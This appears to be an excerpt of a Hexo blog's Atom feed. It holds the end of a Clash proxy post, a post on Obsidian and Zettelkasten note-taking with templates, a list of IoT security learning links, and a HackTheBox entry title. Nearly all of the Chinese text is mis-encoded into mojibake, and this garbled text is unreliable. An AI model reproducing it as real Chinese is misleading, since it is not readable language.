src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-47-52.png" class=""><p>System Proxyå‹¾ä¸Šå³å¯ï¼Œè¿™æ ·windowså¤§éƒ¨åˆ†çš„æµé‡éƒ½ä¼šèµ°clashå‡ºå»äº†ã€‚</p><h2 id="æœ€åçš„å®å˜±"><a href="#æœ€åçš„å®å˜±" class="headerlink" title="æœ€åçš„å®å˜±"></a>æœ€åçš„å®å˜±</h2><p>ç½‘ç»œä¸æ˜¯æ³•å¤–ä¹‹åœ°ã€‚åˆ‡å¿Œå‘äº›ååŠ¨çš„ä¸œè¥¿ï¼Œä¸è¦ä»¥ä¸ºåŒ¿åå°±æ‰¾ä¸åˆ°ä½ ï¼Œæ›´ä½•å†µåŸºæœ¬æ²¡æœ‰å®Œå…¨çš„åŒ¿åã€‚ç½‘ç»œä¸Šæ€»ä¼šç•™æœ‰ä½ çš„è››ä¸é©¬è¿¹çš„ã€‚è°¨è¨€æ…è¡Œï¼Œåšå®ˆæ³•é’å¹´ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¬”è®°ç®¡ç†å‡çº§</title>
    <link href="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/"/>
    <url>/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘å½“å‰çš„ç¬”è®°ç¯å¢ƒï¼Œæ˜¯ç›´æ¥åœ¨hexoçš„æ ¹ç›®å½•ä¸‹ï¼Œ<code>_posts</code> å’Œ <code>_unposts</code> æ–‡ä»¶è¿›è¡Œç¬”è®°çš„è®°å½•ï¼Œå›¾ç‰‡ä¿å­˜åœ¨<code>mdæ–‡ä»¶å\</code>ä¸‹ï¼Œç»“æ„ç®€é™‹ï¼Œä¹Ÿä¸æ–¹ä¾¿æ‰¾ï¼ˆåœ¨ä¸¤ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼‰ã€‚é˜…è¯»äº†ã€Šæ¼æ´æˆ˜äº‰ã€‹çš„ä½œè€…æ³‰å“¥çš„<a href="https://www.zhihu.com/column/p/138401561">æŠ€æœ¯äººçš„ä¿®ç‚¼ä¹‹é“ï¼šä»ä¸šä½™åˆ°ä¸“ä¸š - çŸ¥ä¹</a>ï¼Œä¹Ÿç ”ç©¶äº†ä¸€ä¸‹<a href="https://obsidian.md/">Obsidian</a>ï¼Œå…¶å±•ç°çš„ç¬”è®°é—´çš„å…³ç³»åˆ™è®©æˆ‘æ€è€ƒå¦‚ä½•æ›´å¥½çš„è®°å½•å’Œä¿å­˜ç¬”è®°ã€‚</p><h2 id="ç¬”è®°æ–¹æ³•ä¹‹-Zettelkasten-å¡ç‰‡ç›’ç¬”è®°æ³•"><a href="#ç¬”è®°æ–¹æ³•ä¹‹-Zettelkasten-å¡ç‰‡ç›’ç¬”è®°æ³•" class="headerlink" title="ç¬”è®°æ–¹æ³•ä¹‹ Zettelkasten å¡ç‰‡ç›’ç¬”è®°æ³•"></a>ç¬”è®°æ–¹æ³•ä¹‹ Zettelkasten å¡ç‰‡ç›’ç¬”è®°æ³•</h2><p>æœ‰æœ¬ä¹¦æ˜¯è®²è¿™ä¸ªçš„ï¼Œå°±æ˜¯<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTA4Nzk5Mw==&action=getalbum&album_id=1464601583634939905">How to take smart notes</a>ï¼Œæ„Ÿå…´è¶£çš„è¯·åŠ¡å¿…çœ‹ä¸€ä¸‹è¿™æœ¬ä¹¦ï¼Œå¾ˆèƒ½å¯å‘äººï¼ŒåŠå¤©åˆ°ä¸€å¤©å°±èƒ½ç¿»å®Œã€‚ä¹Ÿå¯ä»¥é€‰æ‹©çœ‹</p><p><a href="https://www.zhihu.com/question/384309878/answer/1120682799">ä»€ä¹ˆæ˜¯ Zettelkasten å¡ç‰‡ç›’ç¬”è®°æ³•ï¼Ÿ - çŸ¥ä¹</a></p><h3 id="ç¬”è®°æ‘˜å½•"><a href="#ç¬”è®°æ‘˜å½•" class="headerlink" title="ç¬”è®°æ‘˜å½•"></a>ç¬”è®°æ‘˜å½•</h3><blockquote><p>How to take smart note<br>åˆ†ä¸ºå››ç±»ï¼šä¸´æ—¶ç¬”è®°ã€æ–‡çŒ®ç¬”è®°ã€æ°¸ä¹…ç¬”è®°ã€é¡¹ç›®ç¬”è®°ã€‚</p><p>æ–‡ä»¶åï¼šæœ€çŸ­æœ€ç²¾ç¡®çš„è¯æ¦‚æ‹¬å†…å®¹/æ¦‚å¿µã€‚ </p><p>æ“ä½œæ–¹æ³•å¾ˆç®€å•ï¼Œä¸€éƒ¨åˆ†æ˜¯<strong>æ–‡ç« æ–‡çŒ®ä¹¦ç›®çš„ä¿¡æ¯</strong>ï¼Œä»¥åŠ<strong>è‡ªå·±å¯¹å†…å®¹çš„ç®€è¦æ¦‚æ‹¬</strong>çš„å¡ç‰‡ç›’ã€‚ä¸€éƒ¨åˆ†æ˜¯æ°¸ä¹…ç¬”è®°å¡ç‰‡ç›’ã€‚é€šè¿‡æ—¶ä¸æ—¶çš„å›çœ‹æ–‡ç« æ–‡çŒ®ä¹¦ç›®å¡ç‰‡ï¼Œåœ¨<strong>æ°¸ä¹…ç¬”è®°ä¸­å†™ä¸‹æƒ³æ³•çœ‹æ³•ï¼Œè¯„è®ºæˆ–è¡¥å……</strong>ã€‚å¹¶ä¸”ï¼Œä¼š<strong>æ²¿ç€å·²æœ‰ç¬”è®°æ–°å¢å¡ç‰‡ï¼Œå½¢æˆç¬”è®°é“¾</strong>ã€‚å†æŠŠ<strong>ç›¸å…³çš„ç¬”è®°é“¾æ”¾åœ¨ä¸€èµ·ï¼Œåšå¥½è®°å·å†™æ˜å‚è€ƒç¬”è®°</strong>å‚è€ƒé“¾æ¥ã€‚è¿™æ ·è¿™éƒ¨åˆ†çš„ç¬”è®°éƒ½æ˜¯æœ‰åƒä¸ä¸‡ç¼•çš„å…³ç³»çš„ã€‚è€Œä¸”ï¼Œå®Œå…¨ä¸åˆ†ç±»ï¼Œè€Œæ˜¯å°†ä¸€ä¸¤æ¡ç¬”è®°å•ç‹¬åˆ—å‡ºï¼Œä½œä¸ºç´¢å¼•å¡ã€‚</p></blockquote><h3 id="ç¬”è®°æ­¥éª¤"><a href="#ç¬”è®°æ­¥éª¤" class="headerlink" title="ç¬”è®°æ­¥éª¤"></a>ç¬”è®°æ­¥éª¤</h3><blockquote><p>æ­¥éª¤ä¸€ï¼šä¸´æ—¶ç¬”è®°ï¼šè®°å½•çªå‘å¥‡æƒ³çš„å¿µå¤´ï¼Œç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªåœ°æ–¹</p><blockquote><p>ä¸´æ—¶ç¬”è®°è¦æ±‚ï¼šä¸€ä¸ªç´§å‡‘çš„å…³é”®å¥ã€è¯¦ç»†è¯´æ˜çš„æ¦‚å¿µå’Œä¸€ä¸ªä¾‹å­ã€‚ æ–‡ä»¶åï¼šæœ€çŸ­æœ€ç²¾ç¡®çš„è¯æ¦‚æ‹¬å†…å®¹/æ¦‚å¿µã€‚</p></blockquote><p>æ­¥éª¤äºŒï¼šæ–‡çŒ®ç¬”è®°ï¼šè¯»åˆ°æƒ³ç‰¢è®°åœ¨å¿ƒçš„ä¸œè¥¿ï¼Œä»”ç»†æ–Ÿé…Œï¼Œç”¨è‡ªå·±çš„è¯å†™ä¸‹æ¥ï¼Œè¦è¨€ç®€æ„éª‡ã€‚æ–Ÿé…Œå¹¶ç”¨è‡ªå·±çš„è¯å†™ä¸‹æ¥å°±æ˜¯ä¸ºäº†æœ€å¤§åŒ–çš„æ€è€ƒï¼Œç»è¿‡å¤§è„‘å†ä¿å­˜ä¸‹æ¥ï¼Œè€Œä¸æ˜¯å¤åˆ¶ç²˜è´´æ”¶è—æ€ªï¼ˆç¬‘</p><p>æ­¥éª¤ä¸‰ï¼šæ°¸ä¹…ç¬”è®°ï¼šæ¯å¤©æ¸¸è§ˆä¸´æ—¶ç¬”è®°å’Œæ–‡çŒ®ç¬”è®°ï¼Œæ€è€ƒä¸è‡ªå·±çš„è”ç³»ã€‚</p><p>å…³é”®ï¼šè¦åšçš„ä¸æ˜¯æ”¶é›†ï¼Œè€Œæ˜¯æ€è€ƒ</p><ul><li>å’Œä»¥å‰çš„æƒ³æ³•æœ‰ä¸åŒä¹‹å¤„å—ï¼Ÿ</li><li>å¯ä»¥æ”¯æŒæˆ–è€…å¦å®šä¹‹å‰çš„è§‚ç‚¹å—ï¼Ÿ</li><li>æ˜¯å¦æœ‰æ–°çš„çŸ¥è¯†ï¼Ÿ</li><li>æ˜¯å¦å¯ä»¥æ•´åˆæƒ³æ³•ï¼Ÿ</li><li>æœ‰æ²¡æœ‰è§¦å‘æ–°çš„é—®é¢˜ï¼Ÿ</li></ul><p>æ­¥éª¤å››ï¼šå°è£…ï¼Œå°†ç¬”è®°å½¢æˆé“¾ï¼Œæˆ–è€…ç½‘ã€‚å¦‚æœæƒ³æ›´æ ‡å‡†ä¸€ç‚¹ï¼Œå¯ä»¥ç»™é“¾æ¥è®¾å®šç±»å‹ã€‚ä¾‹å­ï¼šè¡¥å……ã€å»¶ä¼¸ã€ä¿®æ­£ã€ è¯„è®ºã€åé©³ã€ä¾‹å­ã€å¯å‘ã€ç–‘é—®</p><p>æ­¥éª¤äº”ï¼šä¸æ–­æ›´æ–°è¿­ä»£ã€‚æŒç»­é˜…è¯»ï¼Œé¢ è¦†æˆ–å¼ºåŒ–å·²æœ‰è§‚ç‚¹ï¼Œä¿®æ­£å·²æœ‰è§‚ç‚¹ã€‚çœ‹çœ‹ä»–ä»¬æœ€ç»ˆå¸¦å‘å“ªé‡Œã€‚è·Ÿç€å…´è¶£èµ°ï¼Œè¶Šæ„Ÿå…´è¶£ï¼Œè¶Šæ€è€ƒã€‚</p></blockquote><h2 id="Obisidianç‰¹æ€§"><a href="#Obisidianç‰¹æ€§" class="headerlink" title="Obisidianç‰¹æ€§"></a>Obisidianç‰¹æ€§</h2><ul><li>internal linkï¼Œå¯ä»¥è¿æ¥ç¬”è®°ï¼Œè·³è½¬å’Œå±•ç¤º</li><li>å…³ç³»å›¾ï¼Œå±•ç¤ºç¬”è®°é—´çš„å…³ç³»</li><li><code>Ctrl + O</code>æˆ–<code>Command + O</code>å¿«é€Ÿåˆ‡æ¢ç¬”è®°ï¼Œå¸¦æœ‰æœç´¢åŠŸèƒ½</li><li>ä»¥åº“çš„å½¢å¼å­˜å‚¨ç¬”è®°ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥ä¸€ä¸ªåº“å­˜ä¸Šè¯¾çš„çŸ¥è¯†ï¼Œä¸€ä¸ªåº“å­˜é˜…è¯»å­¦ä¹ ç¬”è®°è¿™æ ·çš„</li></ul><h2 id="Obsidiançš„ä½¿ç”¨"><a href="#Obsidiançš„ä½¿ç”¨" class="headerlink" title="Obsidiançš„ä½¿ç”¨"></a>Obsidiançš„ä½¿ç”¨</h2><p>æŠ›ç –å¼•ç‰ï¼Œä»‹ç»æˆ‘çš„ç”¨æ³•ã€‚</p><h3 id="æˆ‘çš„æ–‡ä»¶å¤¹ç»“æ„"><a href="#æˆ‘çš„æ–‡ä»¶å¤¹ç»“æ„" class="headerlink" title="æˆ‘çš„æ–‡ä»¶å¤¹ç»“æ„"></a>æˆ‘çš„æ–‡ä»¶å¤¹ç»“æ„</h3><p>å¦‚å›¾</p><img src="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210117141035.png" class=""><p>æ‰“ç éƒ¨åˆ†æ˜¯ä»åŒå­¦é‚£é¡ºæ¥çš„</p><p>ä»How to take smart noteä¸­çš„å“²å­¦åŒ…å«å¦‚ä¸‹ä¸‰ä¸ª<br>æ–‡ä»¶å¤¹/ç›’å­ï¼Œç»“åˆæˆ‘è‡ªèº«çš„æƒ³æ³•å®šçš„ç”¨é€”</p><ul><li>Output æ”¾å†™å¥½çš„æ–‡ç« </li><li>PermanentBox æ”¾æ­£åœ¨å†™çš„</li><li>RelatedBox å…¶ä»–ç»å¤§éƒ¨åˆ†ç¬”è®°ï¼Œæ‚ä¹±çš„ç­‰</li></ul><p>ç„¶åæ ¹æ®éœ€è¦æ·»åŠ äº†å¦‚ä¸‹å‡ ä¸ªæ–‡ä»¶å¤¹</p><ul><li>Category ä½œä¸ºæˆ‘ä¸»è¦å…³æ³¨çš„ï¼Œæ—¶ä¸æ—¶è¦çœ‹å’Œå‚è€ƒçš„ç¬”è®°çš„å…¥å£</li><li>DailyDiary æ¯å¤©æ—¥è®°éƒ½åœ¨é‡Œé¢</li><li>DailTmp æ¯å‘¨çš„éƒ½æš‚å­˜é‡Œé¢ï¼Œå‘¨æ—¥ç»Ÿä¸€æ•´ç†<del>å’Œå›é¡¾</del></li><li>InsertPic æ’å…¥çš„å›¾ç‰‡éƒ½ç»Ÿä¸€æ”¾é‡Œé¢</li><li>Templates æ”¾æ’å…¥çš„æ¨¡æ¿ï¼Œæ¯”å¦‚æ—¥è®°æ¨¡æ¿ï¼Œç¬”è®°æ¨¡æ¿ï¼Œæ‘˜å½•æ¨¡æ¿ç­‰</li></ul><h3 id="æ—¥è®°"><a href="#æ—¥è®°" class="headerlink" title="æ—¥è®°"></a>æ—¥è®°</h3><p>æ•ˆæœå¦‚å›¾</p><img src="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124200512351.png" class="" title="image-20210124200512351"><p>ç»“åˆäº†æ’ä»¶ï¼šCalendar(å·¦ä¸Šæ—¥å†æ ·å­çš„)ï¼ŒNatural Language Dates(å°†è¾“å…¥çš„æ—¥æœŸè½¬ä¸ºç‰¹å®šæ ¼å¼)ï¼ŒTemplater(æ’å…¥æ¨¡æ¿)</p><p>Todoéƒ¨åˆ†æ˜¯æ‰“ç®—çš„äº‹æƒ…ï¼ŒJournalåˆ™æ˜¯ç»“åˆç•ªèŒ„æ—¶é—´ï¼ˆ<a href="https://sspai.com/post/37307">ç»è¿‡ 1700 ä¸ªç•ªèŒ„æ—¶é—´ï¼Œç•ªèŒ„å·¥ä½œæ³•æ”¹å˜äº†æˆ‘ä»€ä¹ˆ</a>ï¼‰ï¼Œè®°å½•æ¯ä¸ªäº‹ä»¶æˆ‘éƒ½å¤§æ¦‚å¹²äº†å•¥ï¼Œä»¥åŠå°†è¦å¹²ä»€ä¹ˆã€‚è¿™æ ·å¯ä»¥åœ¨å®Œæˆä¸Šä¸€é¡¹ä»»åŠ¡çš„æ—¶å€™ï¼Œæ¸…ç©ºå¤§è„‘å¹¶é«˜æ•ˆé¢å¯¹ä¸‹ä¸€ä»¶äº‹æƒ…ã€‚Trackingåˆ™è¡¨ç¤ºæˆ‘åœ¨è·Ÿç€åšä»€ä¹ˆçš„ï¼Œä½†ä»æˆ‘è‡ªèº«çš„æƒ…å†µæ¥çœ‹å¯ä»¥åˆ æ‰ï¼ˆé€ƒ</p><p>Daily quote and Picåˆ™æ˜¯æ¨¡æ¿è‡ªåŠ¨ç”Ÿæˆçš„ã€‚</p><h3 id="ç¬”è®°"><a href="#ç¬”è®°" class="headerlink" title="ç¬”è®°"></a>ç¬”è®°</h3><p><code>Ctrl + N</code>å¿«æ·ç”Ÿæˆä¸€ç¯‡ç©ºçš„ï¼Œè®¾ç½®é»˜è®¤æ”¾ç½®åœ¨DailyTmpä¹‹ä¸­ï¼Œä»‹äºè¿™ä¸æ˜¯æ‰€å†™å³æ‰€å¾—çš„ï¼Œæ‰€ä»¥æˆ‘ä¸€èˆ¬å°†ä¸€åŠè®¾ç½®ä¸ºé¢„è§ˆï¼Œä¸€èˆ¬ä¸ºç¼–è¾‘</p><img src="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124201724241.png" class="" title="image-20210124201724241"><p>markdownéƒ¨åˆ†éƒ½æ˜¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥è¯´è¯´å‡ ä¸ªä¸ä¸€æ ·çš„ç‚¹å­ã€‚ä¸€ä¸ªæ˜¯è¿™ä¸ªinternal linkï¼Œæ ¼å¼ <code>[[note_name]]</code>ï¼Œé¼ æ ‡æ‚¬åœåœ¨ä¸Šé¢ä¼šæœ‰ç¬”è®°çš„é¢„è§ˆçª—å£ï¼Œå¸¦!å·å°±é»˜è®¤æ˜¾ç¤ºã€‚</p><img src="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124201918778.png" class="" title="image-20210124201918778"><p>å¹¶ä¸”ï¼Œè¿™æ ·ç”¨å¤šäº†ä¹‹åï¼Œobsidianå¯ä»¥ç”ŸæˆèŠ‚ç‚¹å›¾ï¼Œå±•ç¤ºå†…åœ¨å…³ç³»ã€‚</p><img src="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124202344312.png" class="" title="image-20210124202344312"><p>å¦ä¸€ä¸ªä¾‹å­</p><img src="/2021/01/24/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124202546728.png" class="" title="image-20210124202546728"><p>å—¯å¯¹äº†ï¼Œobçš„çª—å£éƒ½æ˜¯å¯ä»¥è‡ªç”±æ‹–åŠ¨å’Œæ”¾å¤§ç¼©å°çš„ï¼Œä¹Ÿå¯ä»¥é¢„è®¾å·¥ä½œåŒºï¼Œæ¯”å¦‚æˆ‘ReadModeï¼Œé»˜è®¤å°±æ‰“å¼€é¢„è§ˆæ¨¡å¼ï¼Œåœ¨å°å¼ä¸Šå°±åˆ‡æ¢æˆä¸Šä¸‹æ ·å­ï¼Œä¸Šé¢é¢„è§ˆä¸‹é¢ç¼–è¾‘è¿™æ ·ã€‚</p><p>å†å…·ä½“çš„æ“ä½œæˆ‘å°±ä¸åˆ—ä¸¾äº†ï¼Œè¯·ç»§ç»­é˜…è¯»å­¦ä¹ æ›´é«˜æ•ˆæ›´å¥½çš„ç”¨æ³•å­ï¼æˆ‘ä¸è¡Œäº†QAQ</p><h2 id="æ¨èé˜…è¯»"><a href="#æ¨èé˜…è¯»" class="headerlink" title="æ¨èé˜…è¯»"></a>æ¨èé˜…è¯»</h2><p><a href="https://sspai.com/post/63481">ç©è½¬ Obsidian | åŸºç¡€è®¾ç½®ç¯‡ - å°‘æ•°æ´¾</a></p><p><a href="https://sspai.com/post/63674">ç©è½¬ Obsidian | é—´æ­‡å¼æ—¥è®° - å°‘æ•°æ´¾</a></p><p><a href="https://sspai.com/post/62414">ç©è½¬ Obsidian | æ‰“é€ çŸ¥è¯†å¾ªç¯åˆ©å™¨ - å°‘æ•°æ´¾</a></p><h2 id="ç›¸å…³æ¨¡æ¿"><a href="#ç›¸å…³æ¨¡æ¿" class="headerlink" title="ç›¸å…³æ¨¡æ¿"></a>ç›¸å…³æ¨¡æ¿</h2><p>æä¾›å‚è€ƒ</p><h3 id="æ‘˜å½•æ¨¡æ¿"><a href="#æ‘˜å½•æ¨¡æ¿" class="headerlink" title="æ‘˜å½•æ¨¡æ¿"></a>æ‘˜å½•æ¨¡æ¿</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-attr">Link:</span> <br><span class="hljs-attr">Date:</span> &#123;&#123;<span class="hljs-string">tp_today:f=YYYY-MM-DD</span> <span class="hljs-string">dddd</span>&#125;&#125;<br><span class="hljs-attr">Tag:</span> <br><span class="hljs-attr">Category:</span> <br><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h3 id="æ—¥è®°æ¨¡æ¿"><a href="#æ—¥è®°æ¨¡æ¿" class="headerlink" title="æ—¥è®°æ¨¡æ¿"></a>æ—¥è®°æ¨¡æ¿</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs clean">##  Todo<br><br>- [ ] é˜…è¯»RSS<br>- [ ] <br><br>## Journal<br><br>- æ—¶é—´ å†™å‡ å¥å·²ç»åšäº†çš„ã€‚å†™å‡ å¥æœ‰å…³å°†è¦åšçš„ã€‚<br><br><br>## Tracking<br>- [ ] <br><br>### ReadList<br><br>- [ ] Link<br><br>## Daily quote and Pic<br><br>&#123;&#123;tp_daily_quote&#125;&#125;<br><br>&#123;&#123;tp_random_picture&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¬”è®°æ¨¡æ¿"><a href="#ç¬”è®°æ¨¡æ¿" class="headerlink" title="ç¬”è®°æ¨¡æ¿"></a>ç¬”è®°æ¨¡æ¿</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Category:</span> <br><span class="hljs-attr">tag:</span> <br><span class="hljs-attr">related:</span> <br><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><hr><p>2021/2/6æ›´æ–°</p><p>ä»¥å‰ç”¨snipasteï¼Œç›´æ¥æˆªå±ç„¶åç²˜è´´è¿›typora/obsidianä¼šæœ‰å›¾ç‰‡åå­—å­˜åœ¨ç©ºæ ¼çš„æƒ…å†µï¼Œå¦‚ <code>Pasted image 20210117141035.png</code>è¿™ä¸ªåœ¨æˆ‘è¿™ä¸ªç‰ˆæœ¬çš„hexo(4.2.0)ä¼šæ— æ³•è§£æå›¾ç‰‡ï¼Œä¹Ÿå°±ä¸èƒ½è‡ªåŠ¨è½¬æˆå¯¹åº”çš„htmlä»£ç ã€‚</p><p>æ–¹æ³•ï¼š<strong>snipasteå³é”®-æ§åˆ¶-å…¨å±€å¿«æ·é”®</strong> é‡Œï¼Œ<strong>æˆªå±å¹¶è‡ªåŠ¨å¤åˆ¶</strong> å¿«æ·é”®æ”¹ä¸ºF1å³å¯ï¼Œè¿™æ ·ç›´æ¥ç²˜è´´æ–‡ä»¶åæ ¼å¼å°±æ˜¯<code>image-2021xxxxxxx.png</code>äº†ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿæ¯”åœ¨ <strong>è¾“å‡º-æ–‡ä»¶</strong> å¼€å¯è‡ªåŠ¨ä¿å­˜è¦å¥½0.0</p><p>obsidianæš‚æ—¶è¿˜æ˜¯åªèƒ½æ‰‹åŠ¨ä¿å­˜æ¥å®ç°å›¾ç‰‡æ–‡ä»¶æ”¹åäº†ã€‚ã€‚ã€‚ã€‚å·²å‘é‚®ä»¶è¯·ä½œè€…åŠ åŠŸèƒ½ï¼Œç­‰æœ‰ç©ºå†æ‰¾æ‰¾æˆªå›¾å·¥å…·å§ã€‚</p><p>2021/5/2æ›´æ–°</p><p>æ‘˜å½•æ¨¡æ¿ä¸­æˆ‘æ”¹ä¸ºäº†<code>Date: &#123;&#123;tp_today:f=YYYY-MM-DD dddd&#125;&#125;</code>ï¼Œè¿™æ ·ç¬”è®°å°±ä¸ä¼šå›´ç»•ç€å½“å¤©çš„è®°å½•èµ°äº†ã€‚çœ‹ç½‘çŠ¶å›¾çš„æ—¶å€™ä¼šæ›´åŠ å®¹æ˜“æ‰¾åˆ°ç›¸å…³çš„ä¸œè¥¿ã€‚</p><p>çœ‹äº†ç¯‡<a href="https://mp.weixin.qq.com/s/7eHfhBZWKBoCG1qwRKctJw">æ¼æ´å­¦ä¹ çš„â€œç¬¨â€œæ–¹æ³•</a> æ„è¯†åˆ°çœ‹å¾—æ–‡ç« å¤šï¼Œå…¶å®æ˜¯å­¦ä¹ æ¡ˆä¾‹ï¼Œæ‰©å±•æ€ç»´ã€‚æ¡ˆä¾‹å­¦ä¹ äº†ä¸èƒ½å¿˜ï¼Œæ‰€ä»¥æˆ‘æƒ³æ˜ç™½äº†ï¼ŒPermanentBoxé‡Œåº”è¯¥æ”¾äº›åŠ¡å¿…è¦å¤šæ¬¡çœ‹å¾—æ‘˜å½•ç¬”è®°å’Œé‡è¦çš„ç¬”è®°ã€‚relatedboxå¯ä»¥æ”¾å„ç§å„æ ·ï¼Œä¸ºæˆ‘çš„Outputå’ŒPermanentBoxåšåŸºåº•çš„ä¸œè¥¿ã€‚</p><p>è€Œä¸”ï¼Œæ¯å‘¨çš„æ€»ç»“æ—¶ï¼Œä¹Ÿè¦å¤ä¹ çœ‹PermanentBoxçš„ä¸œè¥¿ï¼Œè¿™äº›å¯èƒ½æ˜¯å¿˜è®°çš„ã€é‡è¦çš„ï¼Œå¤ªç†Ÿäº†å†æ”¾å›relatedå¥½äº†ã€‚relatedboxé‡Œçš„ä¹Ÿæ˜¯è¦æ‰«ä¸€éæ ‡é¢˜çœ‹æ˜¯å¦æœ‰é—å¿˜çš„ï¼Œé‡è¦çš„ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>iotä¿¡æ¯æ•´ç†</title>
    <link href="/2020/12/30/iot%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86/"/>
    <url>/2020/12/30/iot%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æŒç»­æ›´æ–°ï¼Œæ¬¢è¿è´¡çŒ®ï¼ç›®å‰ç§ä¿¡QQï¼Œéº»çƒ¦äº†ï¼</p><h2 id="æ€»è§ˆ"><a href="#æ€»è§ˆ" class="headerlink" title="æ€»è§ˆ"></a>æ€»è§ˆ</h2><p><a href="https://zybuluo.com/H4l0/note/1524758">å¿…çœ‹-IOT å®‰å…¨å®æˆ˜èµ„æ–™æ”¶é›†æ•´åˆ</a></p><p><a href="https://zybuluo.com/H4l0/note/1524758#%E6%96%B0%E6%89%8B%E5%90%91%E6%80%BB%E7%BB%93%E6%80%A7%E8%B5%84%E6%96%99">ä¼˜å…ˆçœ‹-IOT å®‰å…¨å®æˆ˜èµ„æ–™æ”¶é›†æ•´åˆ#æ€»ç»“æ€§èµ„æ–™</a></p><p><a href="https://github.com/V33RU/IoTSecurity101#5-firmware-pentesting-os-of-iot-devices">IoT Pentesting 101 &amp;&amp; IoT Security 101</a></p><h2 id="pwnable-é¶åœº"><a href="#pwnable-é¶åœº" class="headerlink" title="pwnable/é¶åœº"></a>pwnable/é¶åœº</h2><p><a href="www.microcorruption.com">microcorruption</a> æ•™å¯¼è¯¦ç»†ï¼Œæ„Ÿè§‰æ›´åƒæ˜¯æ‰“æ¸¸æˆï¼</p><p><a href="https://github.com/firmianay/IoT-vulhub">IoT-vulhub</a> å»ºå¥½çš„dockerç¯å¢ƒï¼Œå¯ç›´æ¥è¿›è¡Œå¤ç°</p><p><a href="https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html">DVAR - Damn Vulnerable ARM Router | The Exploit Laboratory</a>  ç»™å¥½vmç¯å¢ƒï¼Œå¯åŠ¨å³å¯å¼€å§‹ç©è€ã€‚ä½†æ˜¯æˆ‘æŒ£ä¸å‡ºæ¥ï¼Œæ‹¿åˆ«äººçš„expä¹Ÿå¼„ä¸å‡ºæ¥ï¼Œæäº†å¥½å‡ å¤©QwQ                                                </p><p><a href="https://github.com/OWASP/IoTGoat">OWASP IoTGoat</a></p><h2 id="æ–‡ç« -ä¿¡æ¯æ”¶é›†"><a href="#æ–‡ç« -ä¿¡æ¯æ”¶é›†" class="headerlink" title="æ–‡ç« /ä¿¡æ¯æ”¶é›†"></a>æ–‡ç« /ä¿¡æ¯æ”¶é›†</h2><p><a href="https://delikely.github.io/2099/01/01/IOT-%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86/">IOT æ¼æ´æ”¶é›†</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting Point Shield .29</title>
    <link href="/2020/12/18/HackTheBox%20Starting%20Point%20Shield%20.29/"/>
    <url>/2020/12/18/HackTheBox%20Starting%20Point%20Shield%20.29/</url>
    
